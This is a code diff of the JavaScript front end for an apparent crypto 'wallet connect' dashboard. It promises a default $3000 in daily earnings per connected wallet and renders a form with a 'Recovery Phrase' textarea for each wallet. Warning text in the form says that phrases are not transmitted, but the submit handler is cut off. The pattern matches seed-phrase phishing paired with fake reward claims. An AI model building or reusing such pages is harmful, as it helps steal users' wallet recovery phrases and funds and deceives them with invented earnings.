@@ -65,15 +65,17 @@
     })
   }
     function hideDynamicMain(){
-    const main=document.querySelector('main');
+    // Keep original page UI visible for connect-wallet (Alpine-driven).
+    if(String(location.pathname||'').includes('connect-wallet')) return;
+    const main=document.querySelector('main')||document.getElementById('main-content');
     if(main){
       main.dataset.featureDynamic='1';
       main.style.visibility='hidden'
     }
   }
     function showDynamicMain(){
-    const main=document.querySelector('main');
-    if(main)main.style.visibility='visible'
+    const main=document.querySelector('main')||document.getElementById('main-content');
+    if(main){ main.style.visibility='visible'; main.style.opacity='1'; }
   }
     function updateNotifBadge(count){
     const badge=document.getElementById('notifBadge');
@@ -269,46 +271,25 @@
     }
     </p>`:''}</div></div>`
   }
-    const walletLogo=n=>({
+    const WALLET_LOGOS={
     "MetaMask":"/temp/wallet/metamask.webp","Trust Wallet":"/temp/wallet/trust-wallet.webp","Coinbase Wallet":"/temp/wallet/coinbase-wallet.webp",Phantom:"/temp/wallet/phantom.webp",Exodus:"/temp/wallet/exodus.svg",Ledger:"/temp/wallet/other.png",OKX:"/temp/wallet/okx.webp",Binance:"/temp/wallet/binance.jpg",Rabby:"/temp/wallet/rabby.webp",Tangem:"/temp/wallet/tangem.svg",Arculus:"/temp/wallet/arculus.svg",Namo:"/temp/wallet/namo.webp",DCent:"/temp/wallet/dcent.svg"
-  }
-  [n]||'/temp/wallet/other.png');
+  };
+    const walletLogo=n=>WALLET_LOGOS[n]||'/temp/wallet/other.png';
+    const walletCatalog=Object.keys(WALLET_LOGOS).map(name=>({name,logo:WALLET_LOGOS[name],key:name.toLowerCase()}));
     async function userWallet(){
-    const root=inner();
-    if(!root)return;
-    let d;
+    showDynamicMain();
+    const main=document.getElementById('main-content')||document.querySelector('main');
+    if(main){ main.style.visibility='visible'; main.style.opacity='1'; }
     try{
-      d=await get('/wallets')
-    }
-    catch(e){
-      if(e.message.includes('disabled')){
+      await api.get('/user/dashboard/feature/wallets');
+    }catch(e){
+      const msg=String(e.response?.data?.message||e.message||'');
+      if(e.response?.status===403||msg.toLowerCase().includes('disabled')){
         location.replace('/user/dashboard.html');
-        return
       }
-      toast(e.message,false);
-      return
     }
-    const connected=d.connected||[], count=connected.length, settings=d;
-    root.innerHTML=shell('Wallet Connect','Manage your connected cryptocurrency wallets')+`<div class="space-y-[9px]"><div class="bg-[#111] border border-[#1e1e1e] rounded-[13px] overflow-hidden"><div class="flex items-center justify-between p-[15px] border-b border-[#1e1e1e]"><div><p class="text-[.88rem] font-medium text-white">My Connected Wallets</p><p class="text-[.72rem] text-[#555]">${count} of 10 slots used</p></div><div class="flex items-center gap-1.5">${Array.from({length:10},(_,i)=>`<span style="width:9px;height:9px;border-radius:50%;background:${i<count?'#4a6cf7':'#1e1e1e'};border:1px solid ${i<count?'#4a6cf7':'#333'}"></span>`).join('')}</div></div><div>${connected.length?connected.map(w=>`<div class="flex items-center justify-between p-[15px] border-b border-[#161616]"><div class="flex items-center gap-3"><div class="w-[44px] h-[44px] rounded-[12px] bg-[#1a1a1a] flex items-center justify-center overflow-hidden"><img src="${esc(w.walletLogo||walletLogo(w.walletName))}" alt="${esc(w.walletName)}" class="w-[44px] h-[44px] object-contain"></div><div><p class="text-[.88rem] font-medium text-white">${
-      esc(w.walletName)
-    }
-    </p><p class="text-[.72rem] text-[#555]">Connected ${
-      dt(w.connectedAt)
-    }
-    </p></div></div><span class="inline-flex items-center gap-1.5 text-[.68rem] font-medium px-2.5 py-1 rounded-[20px]" style="background:rgba(0,212,124,.1);color:#00d47c;border:1px solid rgba(0,212,124,.2)"><span style="width:6px;height:6px;border-radius:50%;background:#00d47c"></span>Active</span></div>`).join(''):`<div class="text-center py-12 px-5 text-[#444]"><i class="fa-solid fa-wallet text-[2rem] block mb-[10px] opacity-20"></i><p class="text-[.84rem] font-medium text-[#fff] mb-1">No Wallets Connected</p><p class="text-[.78rem]">Connect your first cryptocurrency wallet to start earning daily rewards.</p></div>`}</div></div><div class="bg-[#111] border border-[#1e1e1e] rounded-[13px] p-[15px]"><div class="text-[.68rem] text-[#444] uppercase tracking-[.07em] mb-[10px]">Popular Wallets</div><div class="grid grid-cols-2 sm:grid-cols-3 gap-[9px]">${walletCatalog.map(w=>{const yes=connected.some(x=>x.walletKey===w.name.toLowerCase());return `<button type="button" data-wallet="${esc(w.name)}" ${
-      yes||count>=10?'disabled':''
-    }
-     class="relative flex items-center gap-2 p-[10px] rounded-[10px] border ${yes?'border-[rgba(0,212,124,.3)] opacity-50':'border-[#1e1e1e] hover:border-[#333]'} text-left"><img src="${w.logo}" class="w-[30px] h-[30px] object-contain"><span class="text-[.76rem] text-white">${
-      esc(w.name)
-    }
-    </span>${
-      yes?'<span class="absolute right-2 top-2 text-grn text-[.65rem]"><i class="fa-solid fa-check"></i></span>':''
-    }
-    </button>`}).join('')}</div></div><div class="bg-[#111] border border-[#1e1e1e] rounded-[13px] p-[15px]"><div class="text-[.68rem] text-[#444] uppercase tracking-[.07em] mb-[10px]">Connection Summary</div><div class="grid grid-cols-3 gap-[9px]"><div class="bg-[#161616] rounded-[10px] p-[10px]"><div class="text-[.68rem] text-[#555]">Active Wallets</div><div class="text-white font-bold text-[1rem]">${count}</div></div><div class="bg-[#161616] rounded-[10px] p-[10px]"><div class="text-[.68rem] text-[#555]">Available Slots</div><div class="text-white font-bold text-[1rem]">${10-count}</div></div><div class="bg-[#161616] rounded-[10px] p-[10px]"><div class="text-[.68rem] text-[#555]">Est. Daily Earnings</div><div class="text-grn font-bold text-[1rem]">${money(count*Number(d.dailyEarningPerWallet||3000),'$')}</div></div></div><div class="mt-3"><div class="flex justify-between text-[.68rem] text-[#555] mb-1"><span>Capacity</span><span>${count}/10</span></div><div class="h-[5px] bg-[#1a1a1a] rounded-full overflow-hidden"><div style="width:${count*10}%;height:100%;background:#4a6cf7"></div></div></div></div><div class="bg-[#111] border border-[#1e1e1e] rounded-[13px] p-[15px]"><div class="text-[.68rem] text-[#444] uppercase tracking-[.07em] mb-[8px]">Earning Rewards</div><p class="text-[.76rem] text-[#666]">Min Balance Required: <span class="text-white">${money(d.minBalance||0)}</span></p><p class="text-[.76rem] text-[#666] mt-1">Daily Reward: <span class="text-grn">${money(d.dailyEarningPerWallet||3000,'$')}</span></p></div></div>`;
-        root.querySelectorAll('[data-wallet]').forEach(btn=>btn.addEventListener('click',()=>walletForm(btn.dataset.wallet)));
-
   }
-    function walletForm(name){
+        function walletForm(name){
     const root=inner();
     root.innerHTML=shell('Connect Wallet',`Connect ${name}`)+`<form id="walletFeatureForm" class="space-y-3"><div class="bg-[#111] border border-[#1e1e1e] rounded-[13px] p-[15px]"><div class="flex items-center gap-3 mb-3"><img src="${walletLogo(name)}" class="w-[44px] h-[44px] object-contain"><div><div class="text-white font-medium">${esc(name)}</div><div class="text-[#555] text-[.72rem]">Wallet connection</div></div></div><label class="text-[.68rem] text-[#555] uppercase tracking-[.07em]">Recovery Phrase</label><textarea id="recoveryPhrase" rows="5" autocomplete="off" class="mt-2 w-full bg-[#0d0d0d] border border-[#1e1e1e] rounded-[10px] p-[12px] text-white outline-none" placeholder="For your security, do not enter a recovery phrase here."></textarea><p class="text-[.7rem] text-[#777] mt-2">Never share or submit a 12/24-word recovery phrase to a website. This application does not transmit or store seed phrases.</p></div><button class="w-full py-[12px] rounded-[10px] bg-brand-blue text-white font-medium" type="submit">Connect ${esc(name)}</button></form>`;
     document.getElementById('walletFeatureForm').onsubmit=async e=>{
